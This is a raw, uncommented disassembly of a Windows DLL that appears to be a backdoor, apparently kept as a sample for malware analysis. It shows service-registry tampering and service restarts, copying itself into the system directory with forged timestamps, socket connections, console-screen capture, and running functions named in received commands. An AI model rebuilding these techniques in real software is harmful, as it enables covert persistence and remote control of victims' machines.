lea rcx [ rsp + 0x60 ]
call [ _stricmp@IAT ]
test eax eax
jne r-xdata
lea rdx [ rsp + 0x34 ]
mov rcx rbx
mov [ rsp + 0x34 ] r13d
call [ GetWindowThreadProcessId@IAT ]
mov ecx [ rsp + 0x34 ]
call r12
test eax eax
je r-xdata
mov ecx 0xfffffff5
call [ GetStdHandle@IAT ]
lea rdx [ rsp + 0x38 ]
mov rcx rax
mov rdi rax
call [ GetConsoleScreenBufferInfo@IAT ]
test eax eax
je r-xdata
call [ FreeConsole@IAT ]
jmp r-xdata
movsx ecx [ rsp + 0x38 ]
movsx ebp [ rsp + 0x3a ]
imul ebp ecx
lea ecx [ rbp + 0x4 ]
movsxd rcx ecx
call ??2@YAPEAX_K@Z
mov [ rsp + 0x32 ] r13w
mov [ rsp + 0x30 ] r13w
mov ebx [ rsp + 0x30 ]
mov rsi rax
lea rax [ rsp + 0x50 ]
mov r8d ebp
mov rdx rsi
mov rcx rdi
mov r9d ebx
mov [ rsp + 0x20 ] rax
call [ ReadConsoleOutputCharacterA@IAT ]
mov edx [ rsp + 0x38 ]
mov rcx rsi
call sub_10005cb0
test eax eax
je r-xdata
mov rcx rsi
call ??3@YAXPEAX@Z
add [ rsp + 0x3e ] 0xffff
mov edx [ rsp + 0x3c ]
mov rcx rdi
call [ SetConsoleCursorPosition@IAT ]
lea r11 [ rsp + 0x54 ]
mov r9d ebx
mov r8d ebp
mov rdx rsi
mov rcx rdi
mov [ rsp + 0x20 ] r11
call [ WriteConsoleOutputCharacterA@IAT ]
sub_10005fb0
sub rsp 0x38
cmp [ rcx + 0x18 ] 0x0
mov [ rsp + 0x48 ] rbp
mov [ rsp + 0x50 ] rsi
mov [ rsp + 0x58 ] rdi
mov rbp rdx
mov rsi rcx
mov edi r8d
jne r-xdata
mov rdi [ rsp + 0x58 ]
mov rsi [ rsp + 0x50 ]
mov rbp [ rsp + 0x48 ]
add rsp 0x38
retn
mov rcx [ rcx + 0x20 ]
mov [ rsp + 0x40 ] rbx
lea r8 [ rsp + 0x20 ]
xor ebx ebx
mov edx 0x8004667e
mov [ rsp + 0x20 ] ebx
call [ rw-data ]
test edi edi
jle r-xdata
mov rbx [ rsp + 0x40 ]
nop
nop
nop
add ebx eax
cmp ebx edi
jl r-xdata
mov rcx [ rsi + 0x20 ]
mov r8d edi
movsxd rdx ebx
sub r8d ebx
add rdx rbp
xor r9d r9d
call [ rw-data ]
test eax eax
jle r-xdata
sub_10006040
sub rsp 0x48
mov rax [ rw-data ]
xor rax rsp
mov [ rsp + 0x30 ] rax
xor r8d r8d
mov [ rsp + 0x60 ] rbx
mov rbx rcx
lea edx [ r8 + 0x1 ]
mov [ rsp + 0x68 ] rdi
lea ecx [ rdx + 0x1 ]
call [ rw-data ]
movzx ecx [ rbx + 0x14 ]
mov rdi rax
xor eax eax
mov [ rsp + 0x20 ] eax
mov [ rsp + 0x20 ] 0x2
mov [ rsp + 0x24 ] eax
mov [ rsp + 0x28 ] eax
mov [ rsp + 0x2c ] eax
call [ rw-data ]
mov ecx [ rbx + 0x10 ]
lea rdx [ rsp + 0x20 ]
mov r8d 0x10
mov [ rsp + 0x24 ] ecx
mov rcx rdi
mov [ rsp + 0x22 ] ax
call [ rw-data ]
mov rbx [ rsp + 0x60 ]
cmp eax 0xffffffff
jne r-xdata
mov rax rdi
mov rcx rdi
call [ rw-data ]
xor eax eax
jmp r-xdata
mov rdi [ rsp + 0x68 ]
mov rcx [ rsp + 0x30 ]
xor rcx rsp
call sub_10010a60
add rsp 0x48
retn
sub_100060f0
mov eax 0x2258
call sub_10015ac0
sub rsp rax
mov rax [ rw-data ]
xor rax rsp
mov [ rsp + 0x2240 ] rax
mov [ rsp + 0x2268 ] rbx
mov [ rsp + 0x2270 ] rsi
xor esi esi
cmp [ rcx + 0x4 ] esi
mov [ rsp + 0x2278 ] rdi
mov rdi [ rcx + 0x20 ]
mov rbx rcx
jne r-xdata
mov rdi [ rsp + 0x2278 ]
mov [ rbx + 0x20 ] rsi
mov [ rbx + 0x8 ] rsi
mov [ rbx + 0x4 ] esi
mov [ rbx + 0x18 ] esi
mov rsi [ rsp + 0x2270 ]
mov rbx [ rsp + 0x2268 ]
mov rcx [ rsp + 0x2240 ]
xor rcx rsp
call sub_10010a60
add rsp 0x2258
retn
nop
nop
cmp eax 0xffffffff
je r-xdata
mov rcx [ rbx + 0x20 ]
call [ rw-data ]
mov rcx [ rbx + 0x28 ]
xor r9d r9d
lea r8d [ r9 - 0x1 ]
mov edx 0xa017
mov [ rsp + 0x28 ] si
mov [ rbx + 0x20 ] rsi
mov [ rsp + 0x20 ] esi
call sub_10004e70
cmp eax 0x1
jne r-xdata
cmp [ rbx + 0x4 ] esi
je r-xdata
lea rdx [ rsp + 0x240 ]
xor r9d r9d
mov r8d 0x2000
mov rcx rdi
call [ rw-data ]
test eax eax
jle r-xdata
lea rdx [ rsp + 0x30 ]
xor r9d r9d
xor r8d r8d
xor ecx ecx
mov [ rsp + 0x38 ] rdi
mov [ rsp + 0x30 ] 0x1
mov [ rbx ] esi
mov [ rsp + 0x20 ] rsi
call [ rw-data ]
cmp [ rbx ] esi
jne r-xdata
jmp r-xdata
mov rcx [ rbx + 0x28 ]
lea r9 [ rsp + 0x240 ]
mov edx 0xa016
mov r8d 0xffffffff
mov [ rsp + 0x28 ] si
mov [ rsp + 0x20 ] eax
call sub_10004e70
sub_10006270
push rbx
sub rsp 0x20
cmp [ rcx + 0x8 ] 0x0
mov rbx rcx
mov [ rcx + 0x4 ] 0x1
je r-xdata
add rsp 0x20
pop rbx
retn
mov [ rcx ] 0x1
mov rcx [ rcx + 0x20 ]
test rcx rcx
je r-xdata
mov rcx [ rbx + 0x8 ]
mov edx 0x4e20
call [ WaitForSingleObject@IAT ]
call [ rw-data ]
mov [ rbx + 0x20 ] 0x0
sub_100062f0
push rbx
sub rsp 0x20
cmp [ rcx + 0x20 ] 0x0
mov rbx rcx
jne r-xdata
add rsp 0x20
pop rbx
retn
call sub_10006270
xor r11d r11d
mov rcx rbx
mov [ rbx + 0x4 ] r11d
mov [ rbx + 0x18 ] r11d
call sub_10006040
test rax rax
mov [ rbx + 0x20 ] rax
jne r-xdata
lea rcx [ sub_100060f0 ]
mov r8 rbx
xor edx edx
call [ _beginthread@IAT ]
mov [ rbx + 0x8 ] rax
mov [ rbx + 0x18 ] 0x1
add rsp 0x20
pop rbx
retn
sub_10006350
movzx edx [ rcx ]
xor eax eax
test dl dl
je r-xdata
retn 0x0
nop
nop
mov dl [ rcx + 0x1 ]
add rcx 0x1
test dl dl
jne r-xdata
add eax 0x1
cmp dl 0x2c
jne r-xdata
add eax 0x1
sub_10006380
sub rsp 0x58
mov rax [ rw-data ]
xor rax rsp
mov [ rsp + 0x30 ] rax
mov [ rsp + 0x78 ] rbp
mov [ rsp + 0x50 ] rsi
mov [ rsp + 0x48 ] rdi
mov rdi rcx
movzx ecx [ rcx ]
mov rbp rdx
test cl cl
jne r-xdata
lea eax [ rcx - 0x30 ]
mov [ rsp + 0x70 ] rbx
mov esi 0xffffffff
cmp al 0x9
ja r-xdata
mov eax 0xffffffff
jmp r-xdata
mov eax [ rdi ]
cmp eax [ r--data ]
jne r-xdata
xor ebx ebx
cmp cl 0x30
mov [ rsp + 0x20 ] ebx
jne r-xdata
mov rdi [ rsp + 0x48 ]
mov rsi [ rsp + 0x50 ]
mov rbp [ rsp + 0x78 ]
mov rcx [ rsp + 0x30 ]
xor rcx rsp
call sub_10010a60
add rsp 0x58
retn
cmp cl 0x5b
jne r-xdata
xor ebx ebx
mov [ rdx ] 0x1
mov [ rdx + 0x4 ] ebx
mov [ rdx + 0x14 ] ebx
mov [ rdx + 0x10 ] ebx
mov [ rdx + 0x8 ] rbx
jmp r-xdata
mov rcx rdi
call [ atoi@IAT ]
movsx ecx [ rdi + 0x1 ]
call [ tolower@IAT ]
cmp eax 0x78
jne r-xdata
mov rbx [ rsp + 0x70 ]
mov eax esi
movzx ecx [ rdi + 0x1 ]
cmp cl 0x69
je r-xdata
mov esi ebx
lea r8 [ rsp + 0x20 ]
lea rdx [ r--data ]
mov rcx rdi
call [ sscanf@IAT ]
mov eax [ rsp + 0x20 ]
jmp r-xdata
xor ebx ebx
cmp cl 0x6f
mov [ rdx ] 0x1
mov eax ebx
sete al
mov [ rdx + 0x14 ] ebx
mov [ rdx + 0x4 ] eax
cmp [ rdi + 0x2 ] 0x5d
jne r-xdata
cmp cl 0x6f
jne r-xdata
mov [ rbp + 0x4 ] ebx
mov [ rbp + 0x14 ] eax
mov [ rbp ] ebx
mov [ rbp + 0x8 ] rbx
mov [ rbp + 0x10 ] ebx
jmp r-xdata
cmp [ rdi + 0x3 ] 0x22
jne r-xdata
add rdi 0x4
lea edx [ rbx + 0x22 ]
mov rcx rdi
call [ strchr@IAT ]
test rax rax
mov r11 rax
je r-xdata
sub r11d edi
mov eax r11d
cdq
and eax 0x1
xor eax edx
cmp eax edx
jne r-xdata
mov eax r11d
cdq
sub eax edx
sar eax 0x1
mov [ rbp + 0x10 ] eax
add eax 0x8
movsxd rcx eax
call ??2@YAPEAX_K@Z
test rax rax
mov rcx rax
mov [ rbp + 0x8 ] rax
je r-xdata
mov eax [ rbp + 0x10 ]
xor edx edx
mov [ rsp + 0x40 ] r12
add eax 0x8
movsxd r8 eax
call memset
cmp [ rbp + 0x10 ] ebx
mov r12d ebx
mov rsi rbx
jle r-xdata
mov r12 [ rsp + 0x40 ]
nop
nop
movzx eax [ rdi + rsi * 2 ]
lea r8 [ rsp + 0x20 ]
lea rdx [ r--data ]
mov [ rsp + 0x28 ] al
movzx eax [ rdi + rsi * 2 + 0x1 ]
lea rcx [ rsp + 0x28 ]
mov [ rsp + 0x29 ] al
mov [ rsp + 0x2a ] bl
call [ sscanf@IAT ]
mov r11 [ rbp + 0x8 ]
movzx eax [ rsp + 0x20 ]
add r12d 0x1
mov [ rsi + r11 ] al
add rsi 0x1
cmp r12d [ rbp + 0x10 ]
jl r-xdata
sub_10006580
sub rsp 0x28
test edx edx
mov [ rsp + 0x40 ] rsi
mov [ rsp + 0x48 ] rdi
movsxd rdi edx
mov rsi rcx
jle r-xdata
mov rcx rsi
mov rdi [ rsp + 0x48 ]
mov rsi [ rsp + 0x40 ]
add rsp 0x28
jmp ??3@YAXPEAX@Z
mov [ rsp + 0x38 ] rbx
lea rbx [ rcx + 0x8 ]
add rbx 0x18
sub rdi 0x1
jne r-xdata
call ??3@YAXPEAX@Z
mov rcx [ rbx ]
test rcx rcx
je r-xdata
mov rbx [ rsp + 0x38 ]
sub_100065e0
sub rsp 0x38
mov [ rsp + 0x40 ] rbx
mov [ rsp + 0x48 ] rbp
mov [ rsp + 0x28 ] r13
mov r13 rdx
mov rbx rcx
call sub_10006350
test eax eax
movsxd rbp eax
jne r-xdata
mov [ rsp + 0x50 ] rsi
mov [ rsp + 0x58 ] rdi
mov eax 0x18
mov [ rsp + 0x30 ] r12
mov [ rsp + 0x20 ] r14
mov r14 0xffffffffffffffff
mul rbp
cmovo rax r14
mov rsi rbp
mov rcx rax
call ??2@YAPEAX_K@Z
xor edi edi
test ebp ebp
mov r12 rax
jle r-xdata
mov r13 [ rsp + 0x28 ]
mov rbp [ rsp + 0x48 ]
mov rbx [ rsp + 0x40 ]
add rsp 0x38
retn
test ebp ebp
mov rsi [ rsp + 0x50 ]
jle r-xdata
lea rcx [ rax + 0x8 ]
nop
nop
mov [ r13 ] r12
mov eax ebp
movzx eax [ rbx ]
cmp al 0x20
je r-xdata
mov [ rcx ] rdi
add rcx 0x18
sub rsi 0x1
jne r-xdata
add rbx 0x1
jmp r-xdata
cmp al 0x9
je r-xdata
movsxd rax edi
lea rcx [ rax + rax * 2 ]
lea rdx [ r12 + rcx * 8 ]
mov rcx rbx
call sub_10006380
test eax eax
js r-xdata
mov edx ebp
mov rcx r12
call sub_10006580
mov eax r14d
jmp r-xdata
lea rcx [ rbx + 0x1 ]
mov edx 0x2c
call [ strchr@IAT ]
test rax rax
mov rbx rax
je r-xdata
mov r12 [ rsp + 0x30 ]
mov rdi [ rsp + 0x58 ]
mov r14 [ rsp + 0x20 ]
mov r13 [ rsp + 0x28 ]
mov rbp [ rsp + 0x48 ]
mov rbx [ rsp + 0x40 ]
add rsp 0x38
retn
add edi 0x1
add rbx 0x1
cmp edi ebp
jl r-xdata
sub_10006700
sub rsp 0x58
test r9d r9d
mov [ rsp + 0x68 ] rbp
mov [ rsp + 0x70 ] rsi
mov [ rsp + 0x50 ] r12
mov [ rsp + 0x40 ] r14
mov [ rsp + 0x38 ] r15
mov r15 rcx
mov r12 r8
mov r14d edx
lea ebp [ r9 * 4 + 0x4c ]
movsxd rsi r9d
jle r-xdata
mov [ rsp + 0x60 ] rbx
movsxd rbx ebp
mov [ rsp + 0x78 ] rdi
mov rcx rbx
call ??2@YAPEAX_K@Z
test rax rax
mov rdi rax
je r-xdata
lea rax [ r8 + 0x8 ]
mov r9 rsi
nop
mov r15 [ rsp + 0x38 ]
mov r14 [ rsp + 0x40 ]
mov r12 [ rsp + 0x50 ]
mov rdi [ rsp + 0x78 ]
mov rsi [ rsp + 0x70 ]
mov rbp [ rsp + 0x68 ]
mov rbx [ rsp + 0x60 ]
add rsp 0x58
retn
mov r8 rbx
xor edx edx
mov rcx rax
mov [ rsp + 0x48 ] r13
call memset
mov [ rdi ] r14d
mov [ rdi + 0x4 ] 0x0
mov r13 rdi
add rdi 0x8
test rsi rsi
jle r-xdata
add rax 0x18
sub r9 0x1
jne r-xdata
cmp [ rax ] 0x0
je r-xdata
mov [ rdi ] 0xffffffff
sub edi r13d
mov r9 r13
add edi 0x4
mov r8d ebp
mov edx 0x9fe2
mov rcx r15
mov [ rsp + 0x28 ] 0x0
mov [ rsp + 0x20 ] edi
call sub_10004e70
mov rcx r13
call ??3@YAXPEAX@Z
mov r13 [ rsp + 0x48 ]
lea rbx [ r12 + 0x10 ]
cmp [ rax - 0x4 ] 0x0
je r-xdata
add ebp [ rax + 0x8 ]
add rbx 0x18
sub rsi 0x1
jne r-xdata
cmp [ rbx - 0x8 ] 0x0
je r-xdata
cmp [ rbx - 0xc ] 0x0
je r-xdata
mov eax [ rbx ]
add rdi 0x4
mov [ rdi - 0x4 ] eax
movsxd r8 [ rbx ]
mov rdx [ rbx - 0x8 ]
mov rcx rdi
call memcpy
movsxd r11 [ rbx ]
add rdi r11
sub_10006840
mov [ rsp + 0x20 ] r9d
mov [ rsp + 0x18 ] r8
mov [ rsp + 0x8 ] rcx
sub rsp 0x48
mov [ rsp + 0x40 ] rbx
mov [ rsp + 0x38 ] rsi
mov [ rsp + 0x30 ] rdi
mov ebx r9d
mov rdi r8
mov rsi rcx
xor eax eax
mov [ rsp + 0x20 ] eax
test r9d r9d
jne r-xdata
jmp r-xdata
call rdx
jmp r-xdata
mov r9d ebx
mov r8 rdi
mov edx eax
mov rcx rsi
call sub_10006700
mov rbx [ rsp + 0x40 ]
mov rsi [ rsp + 0x38 ]
mov rdi [ rsp + 0x30 ]
add rsp 0x48
retn
sub_100068c0
sub rsp 0x58
mov [ rsp + 0x60 ] rbx
mov rbx [ rcx + 0x8 ]
mov [ rsp + 0x68 ] rbp
mov [ rsp + 0x78 ] rdi
mov [ rsp + 0x48 ] r13
mov r13 [ rcx ]
mov [ rsp + 0x40 ] r14
call ??3@YAXPEAX@Z
xor eax eax
mov rcx 0xffffffffffffffff
mov rdi rbx
[ rdi ]
not rcx
lea rbp [ rcx + rbx ]
mov rcx 0xffffffffffffffff
mov rdi rbp
[ rdi ]
cmp [ rbx ] al
not rcx
movzx r14d [ rcx + rbp ]
lea rdi [ rcx - 0x1 ]
je r-xdata
mov rcx rbx
call ??3@YAXPEAX@Z
jmp r-xdata
cmp [ rbp ] al
je r-xdata
mov r14 [ rsp + 0x40 ]
mov r13 [ rsp + 0x48 ]
mov rdi [ rsp + 0x78 ]
mov rbp [ rsp + 0x68 ]
mov rbx [ rsp + 0x60 ]
add rsp 0x58
retn
mov rcx rbx
mov [ rsp + 0x70 ] rsi
call [ LoadLibraryA@IAT ]
test rax rax
mov rsi rax
jne r-xdata
mov rdx rbp
mov rcx rax
mov [ rsp + 0x50 ] r12
call [ GetProcAddress@IAT ]
test rax rax
mov r12 rax
je r-xdata
mov rcx rbx
call ??3@YAXPEAX@Z
jmp r-xdata
mov rcx rsi
call [ FreeLibrary@IAT ]
mov rcx rbx
call ??3@YAXPEAX@Z
lea rcx [ rdi + rbp + 0x2 ]
lea rdx [ rsp + 0x30 ]
mov [ rsp + 0x30 ] 0x0
call sub_100065e0
test eax eax
mov r9d eax
jns r-xdata
mov rsi [ rsp + 0x70 ]
mov rdi [ rsp + 0x30 ]
movzx eax r14b
mov rdx r12
mov r8 rdi
mov rcx r13
mov [ rsp + 0x20 ] eax
call sub_10006840
mov rcx rsi
call [ FreeLibrary@IAT ]
mov rcx rdi
call ??3@YAXPEAX@Z
mov rcx rbx
call ??3@YAXPEAX@Z
jmp r-xdata
mov r12 [ rsp + 0x50 ]
sub_10006a00
sub rsp 0x28
test edx edx
mov [ rsp + 0x38 ] rbp
mov [ rsp + 0x48 ] rdi
mov edi edx
mov rbp rcx
jle r-xdata
mov rdi [ rsp + 0x48 ]
mov rbp [ rsp + 0x38 ]
add rsp 0x28
retn
lea eax [ rdx + 0x1 ]
mov [ rsp + 0x30 ] rbx
mov [ rsp + 0x40 ] rsi
movsxd rbx eax
mov rcx rbx
call ??2@YAPEAX_K@Z
mov r8 rbx
xor edx edx
mov rcx rax
mov rsi rax
call memset
mov r8d edi
mov rdx rsi
mov rcx rbp
call sub_10004db0
mov rbx [ rsp + 0x30 ]
cmp eax edi
je r-xdata
mov ecx 0x218
call ??2@YAPEAX_K@Z
lea rcx [ sub_100068c0 ]
xor edx edx
mov r8 rax
mov [ rax ] rbp
mov [ rax + 0x8 ] rsi
call [ _beginthread@IAT ]
mov rsi [ rsp + 0x40 ]
mov rcx rsi
call ??3@YAXPEAX@Z
mov rsi [ rsp + 0x40 ]
mov rdi [ rsp + 0x48 ]
mov rbp [ rsp + 0x38 ]
add rsp 0x28
retn
sub_10006ab0
mov r11 rsp
sub rsp 0x188
mov rax [ rw-data ]
xor rax rsp
mov [ rsp + 0x150 ] rax
mov [ r11 + 0x20 ] rbx
mov [ r11 - 0x8 ] rbp
mov [ r11 - 0x10 ] rsi
mov rsi rcx
mov rbp rdx
mov [ r11 - 0x18 ] rdi
mov [ r11 - 0x20 ] r12
lea rcx [ rsp + 0x40 ]
mov edx 0x104
mov r12 r8
call [ GetSystemDirectoryA@IAT ]
xor eax eax
lea rdi [ rsp + 0x40 ]
mov rcx 0xffffffffffffffff
mov [ rsp + 0x30 ] 0x0
[ rdi ]
mov rax [ r--data ]
lea rcx [ rsp + 0x40 ]
mov [ rdi - 0x1 ] rax
mov eax [ r--data ]
xor r9d r9d
mov [ rdi + 0x7 ] eax
movzx eax [ r--data ]
xor r8d r8d
mov edx 0x80000000
mov [ rsp + 0x28 ] 0x80
mov [ rdi + 0xb ] ax
mov [ rsp + 0x20 ] 0x3
call [ CreateFileA@IAT ]
mov r9 r12
mov r8 rbp
mov rdx rsi
mov rcx rax
mov rbx rax
call [ GetFileTime@IAT ]
mov rcx rbx
mov edi eax
call [ CloseHandle@IAT ]
mov r12 [ rsp + 0x168 ]
mov rsi [ rsp + 0x178 ]
mov rbp [ rsp + 0x180 ]
mov rbx [ rsp + 0x1a8 ]
mov eax edi
mov rdi [ rsp + 0x170 ]
mov rcx [ rsp + 0x150 ]
xor rcx rsp
call sub_10010a60
add rsp 0x188
retn
sub_10006bc0
mov r11 rsp
sub rsp 0x298
mov rax [ rw-data ]
xor rax rsp
mov [ rsp + 0x280 ] rax
mov [ r11 + 0x18 ] rbx
mov rbx rcx
lea rcx [ rsp + 0x60 ]
xor edx edx
mov r8d 0x104
mov [ r11 + 0x20 ] rdi
call memset
lea rcx [ rsp + 0x60 ]
mov edx 0x104
call [ GetSystemDirectoryA@IAT ]
xor eax eax
lea rdi [ rsp + 0x60 ]
mov rcx 0xffffffffffffffff
[ rdi ]
movzx eax [ r--data ]
mov rcx 0xffffffffffffffff
mov [ rdi - 0x1 ] ax
xor eax eax
lea rdi [ rsp + 0x60 ]
[ rdi ]
xor ecx ecx
nop
nop
nop
movzx eax [ rbx + rcx ]
add rcx 0x1
test al al
mov [ rdi + rcx - 0x2 ] al
jne r-xdata
lea rcx [ rsp + 0x60 ]
call [ GetFileAttributesA@IAT ]
mov rbx [ rsp + 0x2b0 ]
cmp eax 0xffffffff
jne r-xdata
mov rdi [ rsp + 0x2b8 ]
mov rcx [ rsp + 0x280 ]
xor rcx rsp
call sub_10010a60
add rsp 0x298
retn
lea rcx [ rsp + 0x170 ]
xor edx edx
mov r8d 0x104
call memset
mov rcx [ rw-data ]
lea rdx [ rsp + 0x170 ]
mov r8d 0x104
call [ GetModuleFileNameA@IAT ]
lea rdx [ rsp + 0x60 ]
lea rcx [ rsp + 0x170 ]
xor r8d r8d
call [ CopyFileA@IAT ]
lea r8 [ rsp + 0x48 ]
lea rdx [ rsp + 0x50 ]
lea rcx [ rsp + 0x40 ]
call sub_10006ab0
test eax eax
je r-xdata
mov [ rsp + 0x30 ] 0x0
lea rcx [ rsp + 0x60 ]
xor r9d r9d
xor r8d r8d
mov edx 0x80000100
mov [ rsp + 0x28 ] 0x80
mov [ rsp + 0x20 ] 0x3
call [ CreateFileA@IAT ]
lea r9 [ rsp + 0x48 ]
lea r8 [ rsp + 0x50 ]
lea rdx [ rsp + 0x40 ]
mov rcx rax
mov rdi rax
call [ SetFileTime@IAT ]
mov rcx rdi
call [ CloseHandle@IAT ]
sub_10006d40
mov r11 rsp
sub rsp 0x248
mov rax [ rw-data ]
xor rax rsp
mov [ rsp + 0x210 ] rax
mov [ r11 + 0x10 ] rbx
mov rbx rcx
lea rcx [ r11 - 0xb8 ]
mov [ r11 + 0x20 ] rsi
mov [ r11 - 0x8 ] rdi
mov [ r11 - 0x20 ] r14
lea r14 [ __dos_header ]
lea rdi [ r11 - 0xb8 ]
xor esi esi
mov rax [ r14 + 0x166e8 ]
mov [ rcx ] rax
mov rax [ r14 + 0x166f0 ]
mov [ rcx + 0x8 ] rax
mov rax [ r14 + 0x166f8 ]
mov [ rcx + 0x10 ] rax
mov rax [ r14 + 0x16700 ]
mov [ rcx + 0x18 ] rax
movzx eax [ r14 + 0x16708 ]
mov [ rcx + 0x20 ] ax
movzx eax [ r14 + 0x1670a ]
mov [ rcx + 0x22 ] al
xor eax eax
mov rcx 0xffffffffffffffff
[ rdi ]
xor ecx ecx
nop
nop
nop
movzx eax [ rbx + rcx ]
add rcx 0x1
test al al
mov [ rdi + rcx - 0x2 ] al
jne r-xdata
lea r8 [ rsp + 0x38 ]
lea rdx [ rsp + 0x190 ]
mov rcx 0xffffffff80000002
mov [ rsp + 0x230 ] r13
mov [ rsp + 0x38 ] rsi
call [ RegOpenKeyA@IAT ]
test eax eax
jne r-xdata
mov eax esi
mov rcx [ rsp + 0x38 ]
lea rax [ rsp + 0x48 ]
lea r9 [ rsp + 0x4c ]
mov [ rsp + 0x28 ] rax
lea rax [ rsp + 0x30 ]
lea rdx [ r--data ]
xor r8d r8d
mov [ rsp + 0x4c ] esi
mov [ rsp + 0x30 ] esi
mov [ rsp + 0x20 ] rax
mov [ rsp + 0x48 ] 0x4
call [ RegQueryValueExA@IAT ]
test eax eax
jne r-xdata
mov rcx [ rsp + 0x38 ]
lea r8 [ rsp + 0x40 ]
lea rdx [ r--data ]
mov [ rsp + 0x40 ] rsi
call [ RegOpenKeyA@IAT ]
test eax eax
je r-xdata
cmp [ rsp + 0x4c ] 0x4
jne r-xdata
lea rcx [ rsp + 0x80 ]
xor edx edx
mov r8d 0x104
call memset
mov rcx [ rsp + 0x40 ]
lea rax [ rsp + 0x48 ]
mov [ rsp + 0x28 ] rax
lea rax [ rsp + 0x80 ]
lea r9 [ rsp + 0x4c ]
lea rdx [ r--data ]
xor r8d r8d
mov [ rsp + 0x48 ] 0x104
mov [ rsp + 0x20 ] rax
call [ RegQueryValueExA@IAT ]
lea rcx [ rsp + 0x80 ]
mov edx 0x5c
call [ strrchr@IAT ]
lea r13 [ rw-data ]
test rax rax
je r-xdata
mov rcx [ rsp + 0x38 ]
call [ RegCloseKey@IAT ]
xor eax eax
jmp r-xdata
mov rcx [ rsp + 0x38 ]
bts [ rsp + 0x30 ] 0x8
lea rax [ rsp + 0x30 ]
lea rdx [ r--data ]
mov r9d 0x4
xor r8d r8d
mov [ rsp + 0x28 ] 0x4
mov [ rsp + 0x20 ] rax
call [ RegSetValueExA@IAT ]
xor edx edx
xor ecx ecx
mov r8d 0xf003f
mov [ rsp + 0x260 ] rbp
mov [ rsp + 0x238 ] r12
call [ OpenSCManagerA@IAT ]
mov r8d 0xf003f
mov rdx rbx
mov rcx rax
mov r12 rax
call [ OpenServiceA@IAT ]
test rax rax
mov rbp rax
je r-xdata
lea rcx [ rax + 0x1 ]
mov rdx r13
call [ _stricmp@IAT ]
test eax eax
jne r-xdata
mov r14 [ rsp + 0x228 ]
mov r13 [ rsp + 0x230 ]
mov rdi [ rsp + 0x240 ]
mov rsi [ rsp + 0x268 ]
mov rbx [ rsp + 0x258 ]
mov rcx [ rsp + 0x210 ]
xor rcx rsp
call sub_10010a60
add rsp 0x248
retn
mov rax [ r14 + 0x166b0 ]
mov rcx [ r14 + 0x166a8 ]
lea rdx [ rsp + 0x80 ]
mov [ rdx ] rcx
mov [ rdx + 0x8 ] rax
mov eax [ r14 + 0x166b8 ]
mov [ rdx + 0x10 ] eax
movzx eax [ r14 + 0x166bc ]
lea rdi [ rsp + 0x80 ]
mov [ rdx + 0x14 ] ax
movzx eax [ r14 + 0x166be ]
mov rcx 0xffffffffffffffff
mov [ rdx + 0x16 ] al
xor eax eax
[ rdi ]
xor edx edx
nop
lea r8 [ rsp + 0x60 ]
mov edx 0x1
mov rcx rax
call [ ControlService@IAT ]
mov rcx [ rsp + 0x40 ]
call [ RegCloseKey@IAT ]
mov rcx [ rsp + 0x38 ]
call [ RegCloseKey@IAT ]
mov eax 0x1
jmp r-xdata
movzx eax [ r13 + rdx ]
add rdx 0x1
test al al
mov [ rdi + rdx - 0x2 ] al
jne r-xdata
xor eax eax
lea rdi [ rsp + 0x80 ]
mov rcx 0xffffffffffffffff
[ rdi ]
lea rax [ rsp + 0x80 ]
lea rdx [ r--data ]
not rcx
mov r9d 0x2
xor r8d r8d
sub rcx 0x1
mov [ rsp + 0x28 ] ecx
mov rcx [ rsp + 0x40 ]
mov [ rsp + 0x20 ] rax
call [ RegSetValueExA@IAT ]
mov rcx [ rsp + 0x40 ]
lea rdx [ r--data ]
call [ RegDeleteValueA@IAT ]
mov rcx [ rsp + 0x40 ]
lea rdx [ r--data ]
call [ RegDeleteValueA@IAT ]
mov rcx [ rsp + 0x38 ]
lea rax [ rsp + 0x50 ]
lea rdx [ r--data ]
mov r9d 0x4
xor r8d r8d
mov [ rsp + 0x28 ] 0x4
mov [ rsp + 0x50 ] 0x2
mov [ rsp + 0x20 ] rax
call [ RegSetValueExA@IAT ]
mov rcx [ rsp + 0x40 ]
call [ RegCloseKey@IAT ]
mov rcx [ rsp + 0x38 ]
call [ RegCloseKey@IAT ]
test rbp rbp
je r-xdata
mov rcx rbp
call [ CloseServiceHandle@IAT ]
mov rcx r12
call [ CloseServiceHandle@IAT ]
mov r12 [ rsp + 0x238 ]
mov rbp [ rsp + 0x260 ]
lea r8 [ rsp + 0x58 ]
mov edx 0x1
mov rcx rbp
mov [ rsp + 0x58 ] rbx
call [ StartServiceA@IAT ]
mov esi eax
sub_10007160
sub rsp 0x48
xor eax eax
cmp ecx 0x2
mov [ rsp + 0x24 ] ecx
mov rcx [ rw-data ]
setne al
test r8d r8d
mov [ rsp + 0x28 ] eax
mov eax 0x42a
mov [ rsp + 0x20 ] 0x10
cmove eax edx
lea rdx [ rsp + 0x20 ]
mov [ rsp + 0x30 ] r8d
mov [ rsp + 0x2c ] eax
mov eax [ rsp + 0x70 ]
mov [ rsp + 0x34 ] r9d
mov [ rsp + 0x38 ] eax
call [ SetServiceStatus@IAT ]
add rsp 0x48
retn
sub_100071c0
push rbx
sub rsp 0x30
mov ebx ecx
mov rcx [ rw-data ]
test rcx rcx
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
call [ CloseHandle@IAT ]
add rsp 0x30
pop rbx
retn
xor r9d r9d
xor r8d r8d
mov edx ebx
lea ecx [ r9 + 0x1 ]
mov [ rsp + 0x20 ] 0x0
call sub_10007160
sub_10007210
sub rsp 0x38
xor r8d r8d
xor edx edx
cmp ecx 0x1
je r-xdata
mov r9d 0x1
mov [ rsp + 0x20 ] 0x1388
lea ecx [ r9 + 0x2 ]
call sub_10007160
mov rcx [ rw-data ]
add rsp 0x38
jmp [ SetEvent@IAT ]
xor r9d r9d
xor ecx ecx
mov [ rsp + 0x20 ] edx
call sub_10007160
add rsp 0x38
retn
sub_10007260
mov r11 rsp
sub rsp 0x88
mov [ r11 + 0x8 ] rbx
mov ebx [ rcx + 0x3c ]
mov [ r11 - 0x10 ] r13
cmp ebx edx
mov r13 rcx
jae r-xdata
xor eax eax
jmp r-xdata
test ebx ebx
je r-xdata
mov r13 [ rsp + 0x78 ]
mov rbx [ rsp + 0x90 ]
add rsp 0x88
retn
cmp [ rbx + rcx ] 0x4550
mov [ r11 - 0x18 ] r14
mov r14 rbx
jne r-xdata
xor eax eax
jmp r-xdata
cmp [ rbx + rcx + 0x18 ] 0x20b
jne r-xdata
mov r14 [ rsp + 0x70 ]
xor eax eax
mov [ r11 + 0x10 ] rbp
movzx ebp [ rbx + rcx + 0x6 ]
